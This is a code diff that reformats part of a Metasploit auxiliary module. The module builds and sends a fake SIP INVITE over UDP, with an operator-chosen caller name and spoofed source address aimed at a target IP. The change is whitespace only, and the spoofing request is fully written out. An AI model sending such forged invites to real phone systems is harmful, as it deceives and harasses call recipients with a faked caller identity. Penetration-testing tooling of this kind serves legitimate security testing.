@@ -41,23 +41,26 @@ class Metasploit3 < Msf::Auxiliary
 
 		begin
 
-		name=datastore['MSG']
-		src=datastore['SRCADDR']
-		connect_udp
+			name = datastore['MSG']
+			src = datastore['SRCADDR']
+			connect_udp
 
-		print_status("Sending Fake SIP Invite to: #{ip}")
-                req  =   "INVITE sip:@127.0.0.1 SIP/2.0" + "\r\n"
-                req  <<  "To: <sip:#{ip}>" + "\r\n"
-                req  <<  "Via: SIP/2.0/UDP #{ip}" + "\r\n"
-                req  <<  "From: \"#{name}\"<sip:#{src}>" + "\r\n"
-                req  <<  "Call-ID: #{(rand(100)+100)}#{ip}" + "\r\n"
-                req  <<  "CSeq: 1 INVITE" + "\r\n"
-                req  <<  "Max-Forwards: 20" +  "\r\n"
-                req  <<  "Contact: <sip:127.0.0.1>" + "\r\n\r\n"
-		udp_sock.put(req)
-		disconnect_udp
+			print_status("Sending Fake SIP Invite to: #{ip}")
+
+			req =  "INVITE sip:@127.0.0.1 SIP/2.0" + "\r\n"
+			req << "To: <sip:#{ip}>" + "\r\n"
+			req << "Via: SIP/2.0/UDP #{ip}" + "\r\n"
+			req << "From: \"#{name}\"<sip:#{src}>" + "\r\n"
+			req << "Call-ID: #{(rand(100)+100)}#{ip}" + "\r\n"
+			req << "CSeq: 1 INVITE" + "\r\n"
+			req << "Max-Forwards: 20" +  "\r\n"
+			req << "Contact: <sip:127.0.0.1>" + "\r\n\r\n"
+
+			udp_sock.put(req)
+			disconnect_udp
 
 		rescue Errno::EACCES
 		end
+
 	end
 end
